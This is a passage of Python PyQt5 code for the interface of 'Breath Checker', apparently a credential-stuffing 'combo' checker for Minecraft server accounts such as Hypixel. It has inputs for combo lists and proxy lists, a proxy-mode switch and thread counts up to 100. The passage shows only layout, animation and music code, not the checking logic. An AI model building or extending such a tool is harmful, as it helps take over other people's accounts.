                                         "    box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:24px;border-radius: 24px;font-family: 微软雅黑;\n"
                                         "}\n"
                                         "QPushButton:hover{                    \n"
                                         "    background:#9D9D9D;\n"
                                         "}\n"
                                         "QPushButton:pressed{\n"
                                         "    background:gray;\n"
                                         "}")
        self.pushButton_34.setText("")
        icon1 = QtGui.QIcon()
        icon1.addPixmap(QtGui.QPixmap("res/directional.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_34.setIcon(icon1)
        self.pushButton_34.setIconSize(QtCore.QSize(20, 20))
        self.pushButton_34.setObjectName("pushButton_34")
        self.pushButton_35 = QtWidgets.QPushButton(self.tab)
        self.pushButton_35.setGeometry(QtCore.QRect(580, 500, 31, 31))
        self.pushButton_35.setStyleSheet("QPushButton{\n"
                                         "    background:#6C6C6C;\n"
                                         "    color:white;\n"
                                         "    box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:24px;border-radius: 24px;font-family: 微软雅黑;\n"
                                         "}\n"
                                         "QPushButton:hover{                    \n"
                                         "    background:#9D9D9D;\n"
                                         "}\n"
                                         "QPushButton:pressed{\n"
                                         "    background:gray;\n"
                                         "}")
        self.pushButton_35.setText("")
        icon2 = QtGui.QIcon()
        icon2.addPixmap(QtGui.QPixmap("res/next.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_35.setIcon(icon2)
        self.pushButton_35.setIconSize(QtCore.QSize(20, 20))
        self.pushButton_35.setObjectName("pushButton_35")
        self.label_11 = QtWidgets.QLabel(self.tab)
        self.label_11.setGeometry(QtCore.QRect(240, 520, 71, 21))
        self.label_11.setStyleSheet("color:white;")
        self.label_11.setObjectName("label_11")
        self.label_music = QtWidgets.QLabel(self.tab)
        self.label_music.setGeometry(QtCore.QRect(260, 490, 40, 40))
        self.label_music.setText("")
        self.label_music.setPixmap(QtGui.QPixmap("res/listen.png"))
        self.label_music.setScaledContents(True)
        self.label_music.setWordWrap(False)
        self.label_music.setObjectName("label_music")
        self.label_15 = QtWidgets.QLabel(self.tab)
        self.label_15.setGeometry(QtCore.QRect(0, 0, 921, 61))
        self.label_15.setStyleSheet("background:rgb(255, 255, 255, 20);")
        self.label_15.setText("")
        self.label_15.setObjectName("label_15")
        self.pushButton_14 = QtWidgets.QPushButton(self.tab)
        self.pushButton_14.setGeometry(QtCore.QRect(840, 100, 21, 21))
        self.pushButton_14.setStyleSheet("QPushButton{\n"
                                         "    background:rgb(255, 255, 255, 60);\n"
                                         "    color:white;\n"
                                         "    box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 1px;font-family: 微软雅黑;\n"
                                         "}\n"
                                         "QPushButton:hover{                    \n"
                                         "    background:rgb(255, 255, 255, 80)\n"
                                         "}\n"
                                         "QPushButton:pressed{\n"
                                         "        background:rgb(255, 255, 255, 10)\n"
                                         "}")
        self.pushButton_14.setObjectName("pushButton_14")
        self.label_36.raise_()
        self.label_33.raise_()
        self.label_34.raise_()
        self.label_35.raise_()
        self.label_37.raise_()
        self.pushButton_33.raise_()
        self.pushButton_34.raise_()
        self.pushButton_35.raise_()
        self.label_11.raise_()
        self.label_15.raise_()
        self.label_music.raise_()
        self.pushButton_14.raise_()
        self.tabWidget.addTab(self.tab, "")
        self.tab_2 = QtWidgets.QWidget()
        self.tab_2.setObjectName("tab_2")
        self.label_5 = QtWidgets.QLabel(self.tab_2)
        self.label_5.setGeometry(QtCore.QRect(310, 107, 591, 97))
        self.label_5.setText("")
        self.label_5.setPixmap(QtGui.QPixmap("res/gsmw.jpg"))
        self.label_5.setScaledContents(True)
        self.label_5.setObjectName("label_5")
        self.label_2 = QtWidgets.QLabel(self.tab_2)
        self.label_2.setGeometry(QtCore.QRect(310, 61, 591, 41))
        self.label_2.setText("")
        self.label_2.setPixmap(QtGui.QPixmap("res/gsmw.jpg"))
        self.label_2.setScaledContents(False)
        self.label_2.setObjectName("label_2")
        self.label_4 = QtWidgets.QLabel(self.tab_2)
        self.label_4.setGeometry(QtCore.QRect(330, 60, 211, 41))
        self.label_4.setStyleSheet("color:white;")
        self.label_4.setObjectName("label_4")
        self.pushButton_17 = QtWidgets.QPushButton(self.tab_2)
        self.pushButton_17.setGeometry(QtCore.QRect(310, 170, 591, 31))
        self.pushButton_17.setStyleSheet("QPushButton{\n"
                                         "    background:rgb(255, 255, 255, 60);\n"
                                         "    color:white;\n"
                                         "    box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 4px;font-family: 微软雅黑;\n"
                                         "}\n"
                                         "QPushButton:hover{                    \n"
                                         "    background:rgb(255, 255, 255, 100);\n"
                                         "}")
        self.pushButton_17.setText("")
        self.pushButton_17.setObjectName("pushButton_17")
        self.pushButton_16 = QtWidgets.QPushButton(self.tab_2)
        self.pushButton_16.setGeometry(QtCore.QRect(310, 140, 591, 31))
        self.pushButton_16.setStyleSheet("QPushButton{\n"
                                         "    background:rgb(255, 255, 255, 60);\n"
                                         "    color:white;\n"
                                         "    box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 4px;font-family: 微软雅黑;\n"
                                         "}\n"
                                         "QPushButton:hover{                    \n"
                                         "    background:rgb(255, 255, 255, 100);\n"
                                         "}")
        self.pushButton_16.setText("")
        self.pushButton_16.setObjectName("pushButton_16")
        self.label_7 = QtWidgets.QLabel(self.tab_2)
        self.label_7.setGeometry(QtCore.QRect(320, 144, 121, 21))
        self.label_7.setStyleSheet("color:white;")
        self.label_7.setObjectName("label_7")
        self.label_6 = QtWidgets.QLabel(self.tab_2)
        self.label_6.setGeometry(QtCore.QRect(320, 172, 121, 21))
        self.label_6.setStyleSheet("color:white;")
        self.label_6.setObjectName("label_6")
        self.label_9 = QtWidgets.QLabel(self.tab_2)
        self.label_9.setGeometry(QtCore.QRect(330, 80, 121, 21))
        self.label_9.setStyleSheet("color:white;")
        self.label_9.setObjectName("label_9")
        self.label_32 = QtWidgets.QLabel(self.tab_2)
        self.label_32.setGeometry(QtCore.QRect(320, 113, 121, 21))
        self.label_32.setStyleSheet("color:white;")
        self.label_32.setScaledContents(False)
        self.label_32.setObjectName("label_32")
        self.pushButton_15 = QtWidgets.QPushButton(self.tab_2)
        self.pushButton_15.setGeometry(QtCore.QRect(310, 110, 591, 31))
        self.pushButton_15.setStyleSheet("QPushButton{\n"
                                         "    background:rgb(255, 255, 255, 60);\n"
                                         "    color:white;\n"
                                         "    box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 4px;font-family: 微软雅黑;\n"
                                         "}\n"
                                         "QPushButton:hover{                    \n"
                                         "    background:rgb(255, 255, 255, 100);\n"
                                         "}")
        self.pushButton_15.setText("")
        self.pushButton_15.setObjectName("pushButton_15")
        self.label_13 = QtWidgets.QLabel(self.tab_2)
        self.label_13.setGeometry(QtCore.QRect(310, 110, 591, 441))
        self.label_13.setStyleSheet("background:rgb(255, 255, 255, 20);")
        self.label_13.setText("")
        self.label_13.setTextFormat(QtCore.Qt.AutoText)
        self.label_13.setScaledContents(False)
        self.label_13.setWordWrap(True)
        self.label_13.setObjectName("label_13")
        self.pushButton_6 = QtWidgets.QPushButton(self.tab_2)
        self.pushButton_6.setGeometry(QtCore.QRect(720, 470, 151, 31))
        self.pushButton_6.setStyleSheet("QPushButton{\n"
                                        "    background:#6C6C6C;\n"
                                        "    box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 14px;font-family: 微软雅黑;\n"
                                        "}\n"
                                        "QPushButton:hover{                    \n"
                                        "    background:#9D9D9D;\n"
                                        "}\n"
                                        "QPushButton:pressed{\n"
                                        "    border: 1px solid #3C3C3C!important;\n"
                                        "}")
        icon3 = QtGui.QIcon()
        icon3.addPixmap(QtGui.QPixmap("res/electronics.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_6.setIcon(icon3)
        self.pushButton_6.setObjectName("pushButton_6")
        self.label_19 = QtWidgets.QLabel(self.tab_2)
        self.label_19.setGeometry(QtCore.QRect(0, 0, 931, 561))
        self.label_19.setText("")
        self.label_19.setPixmap(QtGui.QPixmap("res/demo_blur.png"))
        self.label_19.setScaledContents(True)
        self.label_19.setWordWrap(False)
        self.label_19.setObjectName("label_19")
        self.label_14 = QtWidgets.QLabel(self.tab_2)
        self.label_14.setGeometry(QtCore.QRect(0, 0, 921, 61))
        self.label_14.setStyleSheet("background:rgb(255, 255, 255, 20);")
        self.label_14.setText("")
        self.label_14.setObjectName("label_14")
        self.checkBox = QtWidgets.QCheckBox(self.tab_2)
        self.checkBox.setGeometry(QtCore.QRect(350, 140, 131, 31))
        self.checkBox.setObjectName("checkBox")
        self.checkBox_2 = QtWidgets.QCheckBox(self.tab_2)
        self.checkBox_2.setGeometry(QtCore.QRect(490, 140, 141, 31))
        self.checkBox_2.setObjectName("checkBox_2")
        self.checkBox_3 = QtWidgets.QCheckBox(self.tab_2)
        self.checkBox_3.setGeometry(QtCore.QRect(490, 190, 141, 31))
        self.checkBox_3.setObjectName("checkBox_3")
        self.checkBox_4 = QtWidgets.QCheckBox(self.tab_2)
        self.checkBox_4.setGeometry(QtCore.QRect(350, 190, 131, 31))
        self.checkBox_4.setObjectName("checkBox_4")
        self.comboBox = QtWidgets.QComboBox(self.tab_2)
        self.comboBox.setGeometry(QtCore.QRect(710, 130, 141, 22))
        self.comboBox.setObjectName("comboBox")
        self.comboBox.addItem("")
        self.comboBox.addItem("")
        self.comboBox.addItem("")
        self.comboBox.addItem("")
        self.comboBox.addItem("")
        self.textEdit = QtWidgets.QTextEdit(self.tab_2)
        self.textEdit.setGeometry(QtCore.QRect(330, 230, 551, 221))
        self.textEdit.setObjectName("textEdit")
        self.pushButton_7 = QtWidgets.QPushButton(self.tab_2)
        self.pushButton_7.setGeometry(QtCore.QRect(710, 180, 151, 31))
        self.pushButton_7.setStyleSheet("QPushButton{\n"
                                        "    background:#6C6C6C;\n"
                                        "    box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 14px;font-family: 微软雅黑;\n"
                                        "}\n"
                                        "QPushButton:hover{                    \n"
                                        "    background:#9D9D9D;\n"
                                        "}\n"
                                        "QPushButton:pressed{\n"
                                        "    border: 1px solid #3C3C3C!important;\n"
                                        "}")
        icon6 = QtGui.QIcon()
        icon6.addPixmap(QtGui.QPixmap("res/folder.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_7.setIcon(icon6)
        self.pushButton_7.setObjectName("pushButton_7")
        self.label_19.raise_()
        self.label_13.raise_()
        self.pushButton_7.raise_()
        self.comboBox.raise_()
        self.checkBox_3.raise_()
        self.checkBox.raise_()
        self.checkBox_4.raise_()
        self.checkBox_2.raise_()
        self.label_5.raise_()
        self.label_32.raise_()
        self.label_6.raise_()
        self.label_7.raise_()
        self.label_9.raise_()
        self.label_2.raise_()
        self.label_4.raise_()
        self.pushButton_17.raise_()
        self.pushButton_16.raise_()
        self.pushButton_15.raise_()
        self.label_14.raise_()
        self.pushButton_6.raise_()
        self.textEdit.raise_()
        self.tabWidget.addTab(self.tab_2, "")
        self.tab_5 = QtWidgets.QWidget()
        self.tab_5.setObjectName("tab_5")
        self.label_23 = QtWidgets.QLabel(self.tab_5)
        self.label_23.setGeometry(QtCore.QRect(0, 0, 931, 561))
        self.label_23.setText("")
        self.label_23.setPixmap(QtGui.QPixmap("res/demo_blur.png"))
        self.label_23.setScaledContents(True)
        self.label_23.setWordWrap(False)
        self.label_23.setObjectName("label_23")
        self.label_24 = QtWidgets.QLabel(self.tab_5)
        self.label_24.setGeometry(QtCore.QRect(0, 0, 921, 61))
        self.label_24.setStyleSheet("background:rgb(255, 255, 255, 20);")
        self.label_24.setText("")
        self.label_24.setObjectName("label_24")
        self.lineEdit = QtWidgets.QLineEdit(self.tab_5)
        self.lineEdit.setGeometry(QtCore.QRect(310, 140, 451, 31))
        self.lineEdit.setStyleSheet("background:transparent;\n"
                                    "color:gray;")
        self.lineEdit.setObjectName("lineEdit")
        self.lineEdit_2 = QtWidgets.QLineEdit(self.tab_5)
        self.lineEdit_2.setGeometry(QtCore.QRect(310, 200, 451, 31))
        self.lineEdit_2.setStyleSheet("background:transparent;\n"
                                      "color:gray;")
        self.lineEdit_2.setObjectName("lineEdit_2")
        self.lineEdit_3 = QtWidgets.QLineEdit(self.tab_5)
        self.lineEdit_3.setGeometry(QtCore.QRect(310, 260, 451, 31))
        self.lineEdit_3.setStyleSheet("background:transparent;\n"
                                      "color:gray;")
        self.lineEdit_3.setObjectName("lineEdit_3")
        self.pushButton_18 = QtWidgets.QPushButton(self.tab_5)
        self.pushButton_18.setGeometry(QtCore.QRect(770, 140, 51, 31))
        self.pushButton_18.setStyleSheet("QPushButton{\n"
                                         "    background:rgb(255, 255, 255, 60);\n"
                                         "    color:white;\n"
                                         "    box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 1px;font-family: 微软雅黑;\n"
                                         "}\n"
                                         "QPushButton:hover{                    \n"
                                         "    background:rgb(255, 255, 255, 80)\n"
                                         "}\n"
                                         "QPushButton:pressed{\n"
                                         "        background:rgb(255, 255, 255, 10)\n"
                                         "}")
        self.pushButton_18.setObjectName("pushButton_18")
        self.pushButton_19 = QtWidgets.QPushButton(self.tab_5)
        self.pushButton_19.setGeometry(QtCore.QRect(770, 200, 51, 31))
        self.pushButton_19.setStyleSheet("QPushButton{\n"
                                         "    background:rgb(255, 255, 255, 60);\n"
                                         "    color:white;\n"
                                         "    box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 1px;font-family: 微软雅黑;\n"
                                         "}\n"
                                         "QPushButton:hover{                    \n"
                                         "    background:rgb(255, 255, 255, 80)\n"
                                         "}\n"
                                         "QPushButton:pressed{\n"
                                         "        background:rgb(255, 255, 255, 10)\n"
                                         "}")
        self.pushButton_19.setObjectName("pushButton_19")
        self.pushButton_20 = QtWidgets.QPushButton(self.tab_5)
        self.pushButton_20.setGeometry(QtCore.QRect(770, 260, 51, 31))
        self.pushButton_20.setStyleSheet("QPushButton{\n"
                                         "    background:rgb(255, 255, 255, 60);\n"
                                         "    color:white;\n"
                                         "    box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 1px;font-family: 微软雅黑;\n"
                                         "}\n"
                                         "QPushButton:hover{                    \n"
                                         "    background:rgb(255, 255, 255, 80)\n"
                                         "}\n"
                                         "QPushButton:pressed{\n"
                                         "        background:rgb(255, 255, 255, 10)\n"
                                         "}")
        self.pushButton_20.setObjectName("pushButton_20")
        self.lineEdit_4 = QtWidgets.QLineEdit(self.tab_5)
        self.lineEdit_4.setGeometry(QtCore.QRect(310, 310, 451, 31))
        self.lineEdit_4.setStyleSheet("background:transparent;\n"
                                      "color:gray;")
        self.lineEdit_4.setObjectName("lineEdit_4")
        self.pushButton_21 = QtWidgets.QPushButton(self.tab_5)
        self.pushButton_21.setGeometry(QtCore.QRect(770, 310, 51, 31))
        self.pushButton_21.setStyleSheet("QPushButton{\n"
                                         "    background:rgb(255, 255, 255, 60);\n"
                                         "    color:white;\n"
                                         "    box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 1px;font-family: 微软雅黑;\n"
                                         "}\n"
                                         "QPushButton:hover{                    \n"
                                         "    background:rgb(255, 255, 255, 80)\n"
                                         "}\n"
                                         "QPushButton:pressed{\n"
                                         "        background:rgb(255, 255, 255, 10)\n"
                                         "}")
        self.pushButton_21.setObjectName("pushButton_21")
        self.tabWidget.addTab(self.tab_5, "")
        self.label = QtWidgets.QLabel(self.centralwidget)
        self.label.setGeometry(QtCore.QRect(20, 505, 181, 21))
        self.label.setStyleSheet("color:gray;")
        self.label.setObjectName("label")
        self.pushButton_3 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_3.setGeometry(QtCore.QRect(20, 155, 171, 31))
        self.pushButton_3.setStyleSheet("QPushButton{\n"
                                        "    background:#6C6C6C;\n"
                                        "    color:white;\n"
                                        "    box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 14px;font-family: 微软雅黑;\n"
                                        "}\n"
                                        "QPushButton:hover{                    \n"
                                        "    background:#9D9D9D;\n"
                                        "}\n"
                                        "QPushButton:pressed{\n"
                                        "    border: 1px solid #3C3C3C!important;\n"
                                        "}")
        self.pushButton_3.setIcon(icon3)
        self.pushButton_3.setObjectName("pushButton_3")
        self.pushButton_5 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_5.setGeometry(QtCore.QRect(20, 205, 171, 31))
        self.pushButton_5.setStyleSheet("QPushButton{\n"
                                        "    background:#6C6C6C;\n"
                                        "    color:white;\n"
                                        "    box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 14px;font-family: 微软雅黑;\n"
                                        "}\n"
                                        "QPushButton:hover{                    \n"
                                        "    background:#9D9D9D;\n"
                                        "}\n"
                                        "QPushButton:pressed{\n"
                                        "    border: 1px solid #3C3C3C!important;\n"
                                        "}")
        icon7 = QtGui.QIcon()
        icon7.addPixmap(QtGui.QPixmap("res/symbol.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_5.setIcon(icon7)
        self.pushButton_5.setObjectName("pushButton_5")
        self.label_30 = QtWidgets.QLabel(self.centralwidget)
        self.label_30.setGeometry(QtCore.QRect(2, 55, 231, 495))
        self.label_30.setText("")
        self.label_30.setPixmap(QtGui.QPixmap("res/Gray.png"))
        self.label_30.setScaledContents(True)
        self.label_30.setObjectName("label_30")
        self.pushButton = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton.setGeometry(QtCore.QRect(20, 105, 171, 31))
        self.pushButton.setStyleSheet("QPushButton{\n"
                                      "    background:#6C6C6C;\n"
                                      "    color:white;\n"
                                      "    box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius: 14px;font-family: 微软雅黑;\n"
                                      "}\n"
                                      "QPushButton:hover{                    \n"
                                      "    background:#9D9D9D;\n"
                                      "}\n"
                                      "QPushButton:pressed{\n"
                                      "    border: 1px solid #3C3C3C!important;\n"
                                      "}")
        icon8 = QtGui.QIcon()
        icon8.addPixmap(QtGui.QPixmap("res/house.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton.setIcon(icon8)
        self.pushButton.setObjectName("pushButton")
        self.pushButton_down = QtWidgets.QPushButton(self.tab_2)
        self.pushButton_down.setGeometry(QtCore.QRect(860, 60, 41, 41))
        self.pushButton_down.setStyleSheet("QPushButton{"
                                           "	background:transparent;"
                                           "	color:white;"
                                           "box-shadow: 1px 1px 3px rgba(0,0,0,0.3);font-size:16px;border-radius:"
                                           "14px;font-family: 微软雅黑;"
                                           "}QPushButton:hover{	background:transparent;"
                                           "}QPushButton:pressed{	background:transparent;}")
        icon_pushButton_down = QtGui.QIcon()
        icon_pushButton_down.addPixmap(QtGui.QPixmap("res/multimedia.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_down.setIcon(icon_pushButton_down)
        self.pushButton_down.setObjectName("pushButton_down")

        self.label_12 = QtWidgets.QLabel(self.centralwidget)
        self.label_12.setGeometry(QtCore.QRect(0, -7, 921, 61))
        self.label_12.setStyleSheet("background:rgb(255, 255, 255, 20);")
        self.label_12.setText("")
        self.label_12.setObjectName("label_12")
        self.label_16 = QtWidgets.QLabel(self.centralwidget)
        self.label_16.setGeometry(QtCore.QRect(0, -5, 921, 61))
        self.label_16.setStyleSheet("background:rgb(255, 255, 255, 20);")
        self.label_16.setText("")
        self.label_16.setObjectName("label_16")
        self.label_20 = QtWidgets.QLabel(self.centralwidget)
        self.label_20.setGeometry(QtCore.QRect(0, -5, 931, 561))
        self.label_20.setText("")
        self.label_20.setPixmap(QtGui.QPixmap("res/demo_blur.png"))
        self.label_20.setScaledContents(True)
        self.label_20.setWordWrap(False)
        self.label_20.setObjectName("label_20")
        self.label_38 = QtWidgets.QLabel(self.centralwidget)
        self.label_38.setGeometry(QtCore.QRect(70, 10, 161, 31))
        self.label_38.setLayoutDirection(QtCore.Qt.LeftToRight)
        self.label_38.setStyleSheet("color:Gray;\n"
                                    "font-size:20px;")
        self.label_38.setObjectName("label_38")
        self.label_25 = QtWidgets.QLabel(self.centralwidget)
        self.label_25.setGeometry(QtCore.QRect(10, 0, 51, 51))
        self.label_25.setStyleSheet("")
        self.label_25.setText("")
        self.label_25.setPixmap(QtGui.QPixmap("res/Breath.png"))
        self.label_25.setScaledContents(True)
        self.label_25.setWordWrap(False)
        self.label_25.setObjectName("label_25")
        self.label_20.raise_()
        self.label_16.raise_()
        self.label_12.raise_()
        self.tabWidget.raise_()
        self.label_30.raise_()
        self.pushButton_11.raise_()
        self.pushButton_12.raise_()
        self.label.raise_()
        self.pushButton_3.raise_()
        self.pushButton_5.raise_()
        self.pushButton.raise_()
        self.label_38.raise_()
        self.label_25.raise_()
        self.pushButton_down.raise_()
        self.setCentralWidget(self.centralwidget)
        self.retranslateUi(self)
        self.tabWidget.setCurrentIndex(0)
        QtCore.QMetaObject.connectSlotsByName(self)
    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "Breath Chcker"))
        self.label_34.setText(_translate("MainWindow", "公告:"))
        self.label_35.setText(_translate("MainWindow", "严禁共享自己的账号以及泄露此软件,一经发现以封号处理."))
        self.pushButton_14.setText(_translate("MainWindow", "×"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab), _translate("MainWindow", "主页"))
        self.label_4.setText(_translate("MainWindow", "请选择代理模式"))
        self.label_7.setText(_translate("MainWindow", "HTTP"))
        self.label_6.setText(_translate("MainWindow", "HTTPS"))
        self.label_9.setText(_translate("MainWindow", "[Breath] 花雨庭"))
        self.label_32.setText(_translate("MainWindow", "NoProxy"))
        self.pushButton_6.setText(_translate("MainWindow", "开始"))
        self.checkBox.setText(_translate("MainWindow", "Hypixel Level"))
        self.checkBox_2.setText(_translate("MainWindow", "Death"))
        self.checkBox_3.setText(_translate("MainWindow", "Hypixel Ranking"))
        self.checkBox_4.setText(_translate("MainWindow", "User Name"))
        self.comboBox.setItemText(0, _translate("MainWindow", "单线程"))
        self.comboBox.setItemText(1, _translate("MainWindow", "4线程"))
        self.comboBox.setItemText(2, _translate("MainWindow", "10线程"))
        self.comboBox.setItemText(3, _translate("MainWindow", "50线程"))
        self.comboBox.setItemText(4, _translate("MainWindow", "100线程"))
        self.pushButton_7.setText(_translate("MainWindow", "选择Combos"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_2), _translate("MainWindow", "测卡"))
        self.lineEdit.setText(_translate("MainWindow", "Combos路径"))
        self.lineEdit_2.setText(_translate("MainWindow", "Proxies路径"))
        self.lineEdit_3.setText(_translate("MainWindow", "程序路径"))
        self.pushButton_18.setText(_translate("MainWindow", "..."))
        self.pushButton_19.setText(_translate("MainWindow", "..."))
        self.pushButton_20.setText(_translate("MainWindow", "..."))
        self.lineEdit_4.setText(_translate("MainWindow", "音乐路径"))
        self.pushButton_21.setText(_translate("MainWindow", "..."))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_5), _translate("MainWindow", "设置"))
        self.label.setText(_translate("MainWindow", "Breath Checker"))
        self.pushButton_3.setText(_translate("MainWindow", "测卡"))
        self.pushButton_5.setText(_translate("MainWindow", "设置"))
        self.pushButton.setText(_translate("MainWindow", "主页"))
        self.label_38.setText(_translate("MainWindow", "Breath Checkcer"))
        self.label_5.hide()
        self.pushButton_15.hide()
        self.pushButton_16.hide()
        self.pushButton_17.hide()
        self.label_32.hide()
        self.label_7.hide()
        self.label_9.hide()
        self.label_6.hide()
        self.checkBox.setChecked(True)
        self.checkBox_2.setChecked(True)
        self.checkBox_3.setChecked(True)
        self.checkBox_4.setChecked(True)
        def Thread():
            for i in range(0, 11):
                op = QtWidgets.QGraphicsOpacityEffect()
                op.setOpacity(i / 10)
                self.label_33.setGraphicsEffect(op)
                time.sleep(0.05)
        Thread = threading.Thread(target=Thread)
        Thread.start()
        self.anim = QPropertyAnimation(self.label_33, b"geometry")
        self.anim.setDuration(300)
        self.anim.setStartValue(QRect(280, 210, 100, 100))
        self.anim.setEndValue(QRect(280, 90, 591, 141))
        self.anim.start()
        self.anim2 = QPropertyAnimation(self.label_34, b"geometry")
        self.anim2.setDuration(300)
        self.anim2.setStartValue(QRect(300, 210, 10, 10))
        self.anim2.setEndValue(QRect(300, 89, 101, 31))
        self.anim2.start()
        self.anim3 = QPropertyAnimation(self.label_35, b"geometry")
        self.anim3.setDuration(100)
        self.anim3.setStartValue(QRect(300, 210, 10, 10))
        self.anim3.setEndValue(QRect(300, 129, 541, 101))
        self.anim3.start()
        self.pushButton.clicked.connect(self.first)
        self.pushButton_3.clicked.connect(self.second)
        self.pushButton_5.clicked.connect(self.third)
        self.pushButton_down.clicked.connect(self.down)
        self.pushButton_15.clicked.connect(self.f)
        self.pushButton_16.clicked.connect(self.s)
        self.pushButton_17.clicked.connect(self.t)
        self.pushButton_6.clicked.connect(self.checker)
        self.pushButton_14.clicked.connect(self.Close_notice)
        self.pushButton_12.clicked.connect(self.exit)
        self.pushButton_11.clicked.connect(self.mini)
        self.pushButton_33.clicked.connect(self.music)
        self.pushButton_35.clicked.connect(self.next)
        self.pushButton_34.clicked.connect(self.next)
    def next(self):
        music_list = []
        for i in os.listdir("music"):
            music_list.append(i)
        import random
        random_num = random.randint(0, len(os.listdir("music\\")) - 1)
        print(music_list[random_num])
        import pygame
        filename="music\\" + music_list[random_num]
        pygame.mixer.init()
        pygame.mixer.music.load(filename)
        pygame.mixer.music.play(1)
        music_name = filename.replace(".mp3", "")
        self.label_11.hide()
    def music(self):
        if os.path.exists("music.ini") == False:
            icon = QtGui.QIcon()
            icon.addPixmap(QtGui.QPixmap("res/pause.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
            file = open("music.ini", "w")
            file.close()
            self.pushButton_33.setIcon(icon)
            music_list = []
            for i in os.listdir("music"):
                music_list.append(i)
            import random
            random_num = random.randint(0, len(os.listdir("music\\")) - 1)
            print(music_list[random_num])
            import pygame
            filename="music\\" + music_list[random_num]
            pygame.mixer.init()
            pygame.mixer.music.load(filename)
            pygame.mixer.music.play(1)
            music_name = filename.replace(".mp3", "")
            self.label_11.hide()
            def heart_stop():
                while True:
                    if os.path.exists("music.ini") == False:
                        pygame.mixer.music.stop()
                        break
            Thread = threading.Thread(target = heart_stop)
            Thread.start()
        else:
            icon = QtGui.QIcon()
            icon.addPixmap(QtGui.QPixmap("res/interface.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
            self.pushButton_33.setIcon(icon)
            os.remove("music.ini")    
    def Close_notice(self):
        self.anim = QPropertyAnimation(self.label_33, b"geometry")
        self.anim.setDuration(200)
        self.anim.setStartValue(QRect(280, 90, 591, 141))
        self.anim.setEndValue(QRect(280, 90, 591, 0))
        self.anim.start()
        self.anim2 = QPropertyAnimation(self.label_34, b"geometry")
        self.anim2.setDuration(100)
        self.anim2.setStartValue(QRect(300, 89, 101, 101))
        self.anim2.setEndValue(QRect(300, 89, 101, 0))
        self.anim2.start()
        self.anim3 = QPropertyAnimation(self.label_35, b"geometry")
        self.anim3.setDuration(100)
        self.anim3.setStartValue(QRect(300, 129, 541, 101))
        self.anim3.setEndValue(QRect(300, 129, 541, 0))
        self.anim3.start()
        self.pushButton_14.hide()
    def down(self):
        if os.path.exists("click.ini") == False:
            file = open("click.ini", "w")
            file.close()
            icon_pushButton_down = QtGui.QIcon()
            icon_pushButton_down.addPixmap(QtGui.QPixmap("res/upload.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
            self.pushButton_down.setIcon(icon_pushButton_down)
            self.label_5.show()
            self.pushButton_15.show()
            self.pushButton_16.show()
            self.pushButton_17.show()
            self.label_32.show()
            self.label_7.show()
            self.label_9.show()
            self.label_6.show()
        else:
            icon_pushButton_down = QtGui.QIcon()
            icon_pushButton_down.addPixmap(QtGui.QPixmap("res/multimedia.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
            self.pushButton_down.setIcon(icon_pushButton_down)
            os.remove("click.ini")
            self.label_5.hide()
            self.pushButton_15.hide()
            self.pushButton_16.hide()
            self.pushButton_17.hide()
            self.label_32.hide()
            self.label_7.hide()
            self.label_9.hide()
            self.label_6.hide()
    def f(self):
        os.remove("click.ini")
        self.label_5.hide()
        self.pushButton_15.hide()
        self.pushButton_16.hide()
        self.pushButton_17.hide()
        self.label_32.hide()
        self.label_7.hide()
        self.label_9.hide()
        self.label_6.hide()
        self.label_4.setText("No Proxy")
        icon_pushButton_down = QtGui.QIcon()
        icon_pushButton_down.addPixmap(QtGui.QPixmap("res/multimedia.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_down.setIcon(icon_pushButton_down)
    def s(self):
        os.remove("click.ini")
        self.label_5.hide()
        self.pushButton_15.hide()
        self.pushButton_16.hide()
        self.pushButton_17.hide()
        self.label_32.hide()
        self.label_7.hide()
        self.label_9.hide()
        self.label_6.hide()
        self.label_4.setText("HTTP")
        icon_pushButton_down = QtGui.QIcon()
        icon_pushButton_down.addPixmap(QtGui.QPixmap("res/multimedia.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_down.setIcon(icon_pushButton_down)
    def t(self):
        os.remove("click.ini")
        self.label_5.hide()
        self.pushButton_15.hide()
        self.pushButton_16.hide()
        self.pushButton_17.hide()
        self.label_32.hide()
        self.label_7.hide()
        self.label_9.hide()
        self.label_6.hide()
        self.label_4.setText("HTTPS")
